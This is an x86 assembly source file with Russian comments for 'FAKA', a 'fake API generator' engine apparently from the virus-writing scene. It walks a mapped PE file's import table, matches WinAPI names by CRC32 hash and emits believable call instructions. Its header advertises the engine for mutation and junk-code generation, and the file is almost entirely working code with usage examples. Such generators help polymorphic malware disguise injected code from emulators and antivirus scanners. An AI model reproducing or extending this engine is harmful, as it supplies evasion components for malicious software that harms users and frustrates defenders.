;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;                                                                                                   
;                                                                                                      	 ;
;                                                                                                    	 ;
;                  xxxxxxxxxxxx     xxxxxxxxx     xxxx    xxxx     xxxxxxxxx							 ; 
;                  xxxxxxxxxxxx    xxxx   xxxx    xxxx   xxxx     xxxx   xxxx							 ;
;                  xxxx           xxxx     xxxx   xxxx  xxxx     xxxx     xxxx							 ;
;                  xxxx           xxxx     xxxx   xxxx xxxx      xxxx     xxxx							 ;
;                  xxxxxxxxxx     xxxx     xxxx   xxxxxxxx       xxxx     xxxx							 ;
;                  xxxxxxxxxx     xxxx xxx xxxx   xxxxxxxx       xxxx xxx xxxx							 ;
;                  xxxx           xxxx xxx xxxx   xxxx xxxx      xxxx xxx xxxx							 ;
;                  xxxx           xxxx     xxxx   xxxx  xxxx     xxxx     xxxx							 ;
;                  xxxx           xxxx     xxxx   xxxx   xxxx    xxxx     xxxx							 ;
;                  xxxx           xxxx     xxxx   xxxx    xxxx   xxxx     xxxx							 ;
;																										 ; 
;            																							 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ; 
;										FAKe Api generator												 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										     :)!														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									    функция FAKA													 ; 
;							  ГЕНЕРАТОР (СОЗДАНИЕ) ФЭЙКОВЫХ АПИШЕК										 ;   
;																										 ;
;																										 ;
;ВХОД:																									 ;
;1 параметр - (и единственный) адрес структуры FAKEAPIGEN (ее описание смотри ниже)						 ;  
;--------------------------------------------------------------------------------------------------------;
;ВЫХОД:																									 ;
;EAX - адрес для дальнейшей записи кода (если таковая понадобится).  									 ; 
;+   - значения, переданные в специальные поля структуры ( [ api_va ] )									 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									  	y0p!															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									  ЗАМЕТКИ															 ;
;																										 ; 
;Функция xCRC32A находится в модуле xBase.asm. Можно этот модуль либо также подключать, либо тогда       ;
;вынести нужные функции в этот модуль. Либо расскоментировать в конце этого исходника нужные функи.  	 ;   
;--------------------------------------------------------------------------------------------------------;
;Хэши получились функцией xCRC32A(char *pszFuncName). Можно заменить алгоритм данной функции, в таком    ;
;случае посчитать снова хэши от имен винапи функций, и заменить этими хэшами старые хэши, что   		 ;  
;используются в данном движке. 																			 ; 
;--------------------------------------------------------------------------------------------------------; 
;Здесь демонcтрация только нескольких апишек - остальные с легкостью можно добавить самому.				 ; 
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;         
;																										 ;
;										y0p!															 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									ОПИСАНИЕ СТРУКТУРЫ													 ;
;										FAKEAPIGEN														 ; 
;																										 ;
;																										 ;
;FAKEAPIGEN	struct																						 ;
;	rgen_addr		dd	?		;адрес ГСЧ   															 ; 
;	mapped_addr		dd	?		;база мэппинга (адрес файла в памяти (MapViewOfFile))					 ;
;	buf_for_api		dd	?		;буфер, куда записывать сгенерированную фэйковую апишку					 ;
;	api_hash		dd	?		;хэш от апи (либо 0, либо !=0 значение)									 ;
;	api_va			dd	?   	;VirtualAddress, по которому будет лежать адрес нужной апишки (в IAT)  	 ;
;	reserved1		dd	?		;зарезервировано (пока что)   											 ;
;FAKEAPIGEN	ends   																						 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										y0p!															 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;						ПОЯСНЕНИЕ К ПОЛЯМ СТРУКТУРЫ FAKEAPIGEN											 ;
;																										 ; 
;																										 ;
;[   rgen_addr   ]  : 																					 ; 
;					  так как данный движок (FAKA) разработан без привязки к какому-либо другому мотору, ; 
;					  а для генерации мусора (и некоторых других фич) важен ГСЧ, поэтому адрес ГСЧ 		 ; 
;					  хранится в (данном) поле структуры. 		 										 ;
;					  ВАЖНО: если мотор FAKA будет использовать другой ГСЧ (а не тот, который 	 		 ;
;					  идет с ним в комплекте), надо, чтобы этот другой ГСЧ принимал в качестве 1-го 	 ;
;					  (и единственного!) параметра в стэке число (назовем его N), так как поиск будет в  ;
;					  диапазоне [0..n-1]. И на выходе другой ГСЧ	должен возвращать в EAX случайное 	 ;
;					  число. Остальные регистры должны остаться неизменными. Все. 	 					 ; 
;--------------------------------------------------------------------------------------------------------; 
;[ mapped_addr ]	: 																					 ; 
;					  в этом поле хранится база мэпинга файла (резалт от функи MapViewOfFile)  			 ; 
;					  aka адрес файла в памяти. 														 ; 
;--------------------------------------------------------------------------------------------------------;
;[ buf_for_api ]	: 																					 ;
;					  адрес буфера, куда записывать генерируемые фэйковые апишки. В данный буфер ничего  ;
;					  не пишется (в данном движке) только в 1 случае: 									 ;
;					  	1) если ни одной интересующей нас апишки не найдено в файле, который 		 	 ; 
;						   спроецирован в память; 														 ; 
;--------------------------------------------------------------------------------------------------------;
;[  api_hash   ]	:																					 ; 
;					  поиск апишек происходит по хэшу от имени нужной апишки. Если это поле !=0, тогда 	 ; 
;					  будет поиск ТОЛЬКО этой апишки, хэш от имени которой указан. И если апишка найдена ;
;					  в файле, который спроецирован в память, тогда в поле [ api_va ] вернется 			 ;
;					  VirtualAddress, по которому и будет лежать адрес интересующей нас апишки (адрес в  ;
;					  IAT). Если же указанный хэш еще находился и в заранее подготоаленной (в стэке) 	 ;
;					  табличке хэшей, то будет сгенерена и записна в буфер ( [ buf_for_api ] ) 			 ;
;					  найденная апишка. Если же хэша не было в табличке, то генерации не будет. Ее можно ;
;					  будет сделать самому (использовав адрес в поле [ api_va ] ).						 ;
;					  Если поле [ api_hash] =0, тогда будет поиск заранее подготовленных хэшей. Резалт 	 ;
;					  для них аналогичен (только что написан). 											 ; 
;--------------------------------------------------------------------------------------------------------;
;[   api_va    ]	: 																					 ; 
;					  Если интересующая нас апишка найдена (совпали хэши), то здесь ( [ api_va ] ) 		 ;
;					  кладется VirtualAddress, по которому будет лежать адрес интересующей нас апишки.   ;
;					  А адрес этот находится в IAT. Если интересующая нас апишка не найдена, тогда 		 ;
;					  в этом поле 0.   	 								        						 ; 
;							  																			 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;									  	ФИЧИ															 ;
;																										 ;
;(+) базонезависимость																					 ;
;(+) нет delta-offset и данных (для мутации самое классное)  											 ;  
;(+) прост в использовании																				 ;   
;(+) не использует WinApi'шек 																			 ;    
;(+) нет привязки к другим движкам. Самодостаточный модуль. Может использоваться (и компилиться) 		 ;
;	 	отдельно. Отлично подходит для генератора мусора.												 ;
;(+) генерация разных винапи функций. Просто добавлять новые апишки.  									 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									ИСПОЛЬЗОВАНИЕ: 														 ;
;																										 ;
;1) Подключение:																						 ;
;		xbase.asm, faka.asm						;либо подключать только faka.asm, но в таком случае 	 ; 
;												;необходимые функи (что внизу) раскоментить				 ; 
;2) Вызов (пример stdcall):																				 ;
;																										 ;
;	ПРИМЕР #1																							 ;
;		...																								 ;
;		bBuf1	db 100 dup (00h)				;sizeof FAKEAPIGEN										 ;
;		bBuf2	db 500 dup (00h)				;													 	 ;
;		...																								 ;
;		lea		ecx,bBuf1						;буфер под структуру									 ;
;		lea		edx,bBuf2						;сюда будут записаны сгенерированные fake winapi func	 ;
;		assume	ecx:ptr FAKEAPIGEN 																		 ;
;		mov		[ecx].mapped_addr,330000h		;здесь передаем адрес файла в памяти 					 ;
;		mov		[ecx].buf_for_api,edx			;														 ;
;		mov		[ecx].api_hash,0				;это поле игнорируем. Значит будет произведен поиск 	 ;
;												;заранее подготовленных (в этом модуле) апишек. И если 	 ;
;												;какая-либо из них будет найдена, то она сгенерится и 	 ;
;												;и запишется в указанный выше буфер.					 ;
;		mov		[ecx].api_va,0					;поле игнорируется. Его можно даже и не заполнять.		 ;
;		push	ecx																						 ;
;		call	FAKA							;вызываем функу генерации и записи fake WinApi func. 	 ;
;												;теперь в буфере bBuf2 у нас записаны найденная 		 ;
;												;fake winapi function. 									 ; 
;--------------------------------------------------------------------------------------------------------; 
;	ПРИМЕР #2																							 ;
;		...																								 ;
;		bBuf1	db 100 dup (00h)				;sizeof FAKEAPIGEN										 ;
;		bBuf2	db 500 dup (00h)				;														 ;
;		...																								 ;
;		lea		ecx,bBuf1						;буфер под структуру									 ;
;		lea		edx,bBuf2						;сюда будут записаны сгенерированные fake winapi func	 ;
;		assume	ecx:ptr FAKEAPIGEN 																		 ;
;		mov		[ecx].mapped_addr,330000h		;здесь передаем адрес файла в памяти 					 ;
;		mov		[ecx].buf_for_api,edx			;														 ; 
;		mov		[ecx].api_hash,19886E42h		;в это поле теперь кладем хэш от имени функи GetVersion. ;
;		push	ecx																						 ; 
;		call	FAKA							;вызываем функу генерации и записи fake WinApi func. 	 ;
;																										 ;
;		cmp		[ecx].api_va,0 					;проверим, нашли ли мы нужную нам апишку?				 ;
;		je		_ret_																					 ;
;		sub		eax,[ecx].buf_for_api																	 ;
;		test	eax,eax							;если апишка найдена, и ее хэш был в заранее 			 ;
;		jne		_ret_							;подготовленной табличке, то эта апи сгенерилась.		 ; 
;		mov		word ptr [eax],15FFh			;Иначе сами и сгенерим интересующую нас апишку. 		 ;  
;		push	dword ptr [ecx].api_va																	 ;
;		pop		dword ptr [eax+2]																		 ;
;_ret_: 																								 ; 
;																										 ;
;																										 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;v1.0


													;m1x
												;pr0mix@mail.ru
											;EOF 




;========================================================================================================
;структура FAKEAPIGEN 
;========================================================================================================
FAKEAPIGEN	struct
	rgen_addr		dd	?   
	mapped_addr		dd	?
	buf_for_api		dd	?
	api_hash		dd	?
	api_va			dd	?   
	reserved1		dd	?  
FAKEAPIGEN	ends  
;======================================================================================================== 


fNTHeaders		equ		dword ptr [ebp-04] 		;указатель на IMAGE_NT_HEADERS 
fBase			equ		dword ptr [ebp-08]		;ImageBase 
NUM_HASH		equ		7						;кол-во заранее подготовленных хэшей от имен апишек (при добавлении своего хэша увеличить это значение)    
    



 
FAKA:											;функция FAKA 
	pushad										;сохраняем регистры 
	mov		ebp,esp								;[ebp+00] 	
	mov		edi,dword ptr [ebp+24h] 
	assume	edi:ptr FAKEAPIGEN					;edi - указатель на структуру FAKEAPIGEN  
	mov		esi,[edi].mapped_addr 
	assume	esi:ptr IMAGE_DOS_HEADER 
	add		esi,[esi].e_lfanew
	assume	esi:ptr IMAGE_NT_HEADERS 
	and		dword ptr [edi].api_va,0			;обнуляем данное поле      
	push	esi									;[ebp-04] ;ImageBase   
	push	[esi].OptionalHeader.ImageBase		;[ebp-08] ;IMAGE_NT_HEADERS
	
	push	000000000h							;[ebp-12] ;обозначим конец таблички хэшей последним нулевым элементом  
 
	cmp		[edi].api_hash,0
	jne		_searchapi_
;--------------------------------------------------------------------------------------------------------
;				А ВОТ И САМА ТАБЛИЧКА ХЭШЕЙ (хранится в стэке) (чтобы генерить и другие апишки, также добавить сюда и свой хэш)     
;--------------------------------------------------------------------------------------------------------  
	push	0B1866570h 							;GetModuleHandleA 
	push	03FC1BD8Dh 							;LoadLibraryA 
	push	04CCF1A0Fh 							;GetVersion 
	push	02D66B1C5h 							;GetCommandLineA 
	push	0D9B20494h 							;GetCommandLineW
	push	0D0861AA4h 							;GetCurrentProcess
	push	0C97C1FFFh 							;GetProcAddress
;-------------------------------------------------------------------------------------------------------- 
	mov		edx,esp
	push	NUM_HASH 
	push	edx  
	call	swap_elem							;случайным образом размешаем элементы в табличке (табличке хэшей) 
_cycle_sa_:	
	pop		ecx									;затем выбираем очередной хэш (из таблички (из стэка)) 
	test	ecx,ecx								;хэши закончились? 
	je		_apinotfound_						;если да, то на выход         
	mov		[edi].api_hash,ecx					;иначе поместим выбранный хэш в определенное для него поле  
_searchapi_:  
    call	search_api							;вызываем вспомогательную функцию поиска нужной апишки по ее хэшу 
    											;в качестве резалта этой функи вернется VirtualAddress (в поле [ api_va ] ), 
    											;по которому и будет лежать адрес нужной апишки в IAT 
    cmp		[edi].api_va,0						;если нужная апишка не найдена, то выберем хэш от другой апишки, и будем искать уже по нему 
    je		_cycle_sa_  
;--------------------------------------------------------------------------------------------------------   
;чтобы генерить и другие апишки, также добавить сюда и свою проверку 
;-------------------------------------------------------------------------------------------------------- 
    											;иначе узнаем, хэш от какой функи мы нашли? и в случае совпадения, сгенерим (запишем) нужную апишку 
    cmp		[edi].api_hash,0B1866570h			;GetModuleHandleA
    je		_f01_
    cmp		[edi].api_hash,03FC1BD8Dh			;LoadLibraryA          
    jne		_n01_
_f01_:
	call	fGetModuleHandleA
	jmp		_fakaend_  

_n01_: 
	cmp		[edi].api_hash,04CCF1A0Fh			;GetVersion
	je		_f02_ 
	cmp		[edi].api_hash,02D66B1C5h			;GetCommandLineA  
	je		_f02_ 
	cmp		[edi].api_hash,0D9B20494h			;GetCommandLineW 
	je		_f02_ 
	cmp		[edi].api_hash,0D0861AA4h			;GetCurrentProcess
	jne		_n02_ 
_f02_: 
	call	fGetVersion
	jmp		_fakaend_
_n02_: 	 
	cmp		[edi].api_hash,0C97C1FFFh			;GetProcAddress 
	jne		_n03_ 
_f03_:
	call	fGetProcAddress 
	jmp		_fakaend_
_n03_: 	 
	jmp		_cycle_sa_  
;-------------------------------------------------------------------------------------------------------- 
_apinotfound_:      
	mov		edi,[edi].buf_for_api 
_fakaend_: 
    mov		esp,ebp       
	mov		dword ptr [ebp+1Ch],edi				;EAX = EDI      
	popad
	ret		4									;выходим

;========================================================================================================
;подфункция search_api 
;========================================================================================================

search_api: 	
	push	esi 
	mov		edx,[esi].OptionalHeader.DataDirectory[1*8].VirtualAddress
	test	edx,edx								;проверяем, есть ли табличка импорта (ТИ) в файле, который в памяти ?        
	je		_searchapiret_						;если нет ТИ, то на выход. Иначе продолжаем 
	push	edx 								;кладем RVA ТИ 
	push	esi 								;и адрес IMAGE_NT_HEADERS 
	call	fRvaToRaw 							;и вызываем функу, которая по RVA получаем его RAW смещение в файле 
	mov		esi,eax								;сохраняем полученное RAW смещение в ESI 
	add		esi,[edi].mapped_addr				;и прибавляем базу мэпинга 
	assume	esi:ptr IMAGE_IMPORT_DESCRIPTOR		;ESI - указатель на IMAGE_IMPORT_DESCRIPTOR   
;-------------------------------------------------------------------------------------------------------- 
_cycleIID_: 
	mov		edx,[esi].OriginalFirstThunk
	mov		ebx,[esi].FirstThunk 
	test	edx,edx								;если поле OriginalFirstThunk = 0 (такое бывает в борладских прогах), то  
	jne		_oft_ 
	mov		edx,ebx								;кладем вместо OriginalFirstThunk RVA адрес FirstThunk  
_oft_: 
	push	edx
	push	fNTHeaders 
	call	fRvaToRaw							;получаем RAW смещение по переданному RVA 
	mov		edx,eax
	add		edx,[edi].mapped_addr 
	assume	edx:ptr IMAGE_THUNK_DATA32
	push	ebx
	push	fNTHeaders
	call	fRvaToRaw							;etc 
	mov		ebx,eax
	add		ebx,[edi].mapped_addr  
	assume	ebx:ptr IMAGE_THUNK_DATA32
	test	ecx,ecx								;в ECX - IMAGE_SECTION_HEADER нужного элемента в табличке секций. 
	jne		_sechdr_							;если RVA находится в пределах заголовка файла, то в стэке кладем нули 
	push	0
	push	0
	jmp		_cycleITD32_ 
_sechdr_: 
	assume	ecx:ptr IMAGE_SECTION_HEADER
	push	[ecx].VirtualAddress				;иначе кладем в стэк VirtualAddress & PointerToRawData 
	push	[ecx].PointerToRawData  
;--------------------------------------------------------------------------------------------------------
_cycleITD32_:   
	push	[edx].u1.AddressOfData
	push	fNTHeaders
	call	fRvaToRaw
	bt		eax,31 
	jc		_ordinalok_ 
	add		eax,[edi].mapped_addr 
	;assume	eax:ptr IMAGE_IMPORT_BY_NAME
	inc		eax
	inc		eax   
	push	eax   
	call	xCRC32A 							;далее получаем хэш от имени функции   
	mov		ecx,ebx
	sub		ecx,[edi].mapped_addr				;map_addr  
	sub		ecx,dword ptr [esp] 				;PointerToRawData
	add		ecx,dword ptr [esp+04]				;VirtualAddress
	add		ecx,fBase 							;ImageBase
												;в ECX VirtualAddress, по которому лежит адрес очередной винапи функции    

	cmp		eax,[edi].api_hash 					;мы нашли нужную апишку? (хэши совпали?)  
	jne		_nxtITD32_							;если нет, то продолжаем поиск
	mov		[edi].api_va,ecx					;если да, то сохраним вычисленный VA в поле [ api_va ] 
	pop		eax									;корректировка стэка 
	pop		eax 
	jmp		_api_hash_ok_						;и на выход   		
;--------------------------------------------------------------------------------------------------------    
_nxtITD32_:
_ordinalok_: 		  
	add		edx,sizeof IMAGE_THUNK_DATA32		;переходим к следующему элементу IMAGE_THUNK_DATA32    
	add		ebx,sizeof IMAGE_THUNK_DATA32 
	cmp		[edx].u1.AddressOfData,0			;это последний был элемент ?
	jne		_cycleITD32_
	pop		eax									;корректируем стэк 
	pop		eax 
	add		esi,sizeof IMAGE_IMPORT_DESCRIPTOR	;переходим к следующему элементу IMAGE_IMPORT_DESCRIPTOR 
	cmp		[esi].FirstThunk,0					;это был последний элемент ? 
	jne		_cycleIID_
_notapi_:
_api_hash_ok_:      
_searchapiret_: 
	pop		esi 
	ret											;выходим
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции FAKA 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	   





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция fRvaToRaw
;получение RAW смещения по заданному RVA 
;ВХОД (fRvaToRaw(IMAGE_NT_HEADERS *imNTh, DWORD RVA)):
;	imNTh - указатель на IMAGE_NT_HEADERS 
;	RVA   - RVA, RAW смещение которого надо найти 
;ВЫХОД:
;	EAX   - RAW смещение
; 	ECX   - указатель на IMAGE_SECTION_HEADER нужного элемента в табличке секций, либо 0. 
;ЗАМЕТКИ:
;	если ECX != 0, то в ECX - указатель на IMAGE_SECTION_HEADER. Этот элемент содержит данные той 
;	секции, в пределах которой расположен RVA. 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
fRvaToRaw:
	pushad
	mov		ebp,esp
	mov		esi,dword ptr [ebp+24h]				;ESI - указатель на IMAGE_NT_HEADERS  
	mov		ebx,dword ptr [ebp+28h]				;EBX - RVA              
	assume	esi:ptr IMAGE_NT_HEADERS 
	movzx	ecx,[esi].FileHeader.NumberOfSections 
	movzx	edx,[esi].FileHeader.SizeOfOptionalHeader
	lea		esi,dword ptr [ edx + esi + 4 + sizeof(IMAGE_FILE_HEADER) ]
	assume	esi:ptr IMAGE_SECTION_HEADER
_cyclenxtsec_: 
  	mov		edx,[esi].VirtualAddress
  	cmp		ebx,edx 
  	jb		_nxtsection_
  	cmp		[esi].Misc.VirtualSize,0
  	je		_phsizeok01_
  	add		edx,[esi].Misc.VirtualSize
  	jmp		_sizeok01_
_phsizeok01_:
	add		edx,[esi].SizeOfRawData
_sizeok01_: 	   
  	cmp		ebx,edx
  	jae		_nxtsection_
  	sub		ebx,[esi].VirtualAddress
  	add		ebx,[esi].PointerToRawData
  	jmp		_rawok_
_nxtsection_:  
 	add		esi,sizeof IMAGE_SECTION_HEADER 
  	loop	_cyclenxtsec_
  	xor		esi,esi
_rawok_:
	mov		dword ptr [ebp+1Ch],ebx
	mov		dword ptr [ebp+18h],esi     	 
	popad
	ret		4*2
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции fRvaToRaw 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;comment %   	
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция swap_elem
;перемешивание элементов в массиве случайным образом 
;ВХОД (stdcall) (swap_elem(DWORD *pMas,DWORD num_elem)):
;	pMas     - массив, элементы которого и надо перемешать случайным образом; 
;	num_elem - количество элементов в массиве;
;ВЫХОД:
;	(+) элементы отлично перемешаны; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  
swap_elem:
	pushad
	mov		ecx,dword ptr [esp+28h]
	mov		esi,dword ptr [esp+24h]
	xor		edx,edx
_cycleswap_: 
	push	ecx
	call	[edi].rgen_addr 
	push	dword ptr [esi+edx*4]
	push	dword ptr [esi+eax*4]
	pop		dword ptr [esi+edx*4]
	pop		dword ptr [esi+eax*4]
	inc		edx
	cmp		edx,ecx
	jne		_cycleswap_
	popad
	ret		4*2
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции swap_elem 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
		;%  





comment %     
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функция xstrlen
;поиск длины строки
;ВХОД ( xstrlen(char *pszStr) ):
;pszStr - указатель на строку, чью длину надо посчитать 
;ВЫХОД:
;EAX    - длина строки (в байтах) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xstrlen:
	push	edi		 
	mov		edi,dword ptr [esp+08]
	push	edi  
	xor		eax,eax
_numsymbol_: 
	scasb
	jne		_numsymbol_
	xchg	eax,edi
	dec		eax
	pop		edi
	sub		eax,edi
	pop		edi  
	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xstrlen 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32A
;вычисление CRC строки
;ВХОД (stdcall) (xCRC32A(char *pszStr)):
;	pszStr - строка, чей хэш надо посчитать 
;ВЫХОД:
;	(+) EAX - хэш от строки 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32A:
	push	ecx
	mov		ecx,dword ptr [esp+08]   
	push	ecx
	call	xstrlen
	test	eax,eax
	je		_xcrc32aret_
	push	eax
	push	ecx 
	call	xCRC32
_xcrc32aret_: 
	pop		ecx 
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции xCRC32A 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 			




	 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xCRC32
;подсчет CRC32 
;ВХОД (stdcall) (xCRC32(BYTE *pBuffer,DWORD dwSize)):
;	pBuffer - буфер, в котором код, чей crc32 надо посчитать
;	dwSize  - сколько байт посчитать ? (+) 
;ВЫХОД:
;	(+) EAX - CRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xCRC32:
	pushad
	mov		ebp,esp
	xor		eax,eax
	mov		edx,dword ptr [ebp+24h]
	mov		ecx,dword ptr [ebp+28h]
	jecxz	@4 
	dec		eax 
@1:
	xor		al,byte ptr [edx]
	inc		edx
	push	08
	pop		ebx
@2:
	shr		eax,1
	jnc		@3
	xor		eax,0EDB88320h
@3:
	dec		ebx 
	jnz		@2
	loop	@1
	not		eax
@4:
	mov		dword ptr [ebp+1Ch],eax 
	popad
	ret		4*2 							
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx		
;конец функции xCRC32 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	
		;%  





;========================================================================================================
;генерация апишек
;ВХОД:  
;	EDI - указатель на структуру FAKEAPIGEN (поле [edi].api_va должно быть правильным (найден нужный VirtualAddress)  
;======================================================================================================== 	

fGetModuleHandleA:
fLoadLibraryA:
	mov		ax,006Ah
	push	[edi].api_va 
	mov		edi,[edi].buf_for_api 
	stosw 
	mov		ax,15FFh
	stosw
	pop		eax     
	stosd  
	ret
;-------------------------------------------------------------------------------------------------------- 
fGetVersion:
fGetCommandLineA:
fGetCommandLineW:  
fGetCurrentProcess: 
	mov		ax,15FFh
	push	[edi].api_va  
	mov		edi,[edi].buf_for_api
	stosw
	pop		eax 
	stosd
	ret   
;-------------------------------------------------------------------------------------------------------- 
fGetProcAddress:
	mov		eax,006A006Ah
	push	[edi].api_va  
	mov		edi,[edi].buf_for_api  
	stosd 
	mov		ax,15FFh
	stosw
	pop		eax 
	stosd 
	ret
;-------------------------------------------------------------------------------------------------------- 




 
;========================================================================================================
;XD 
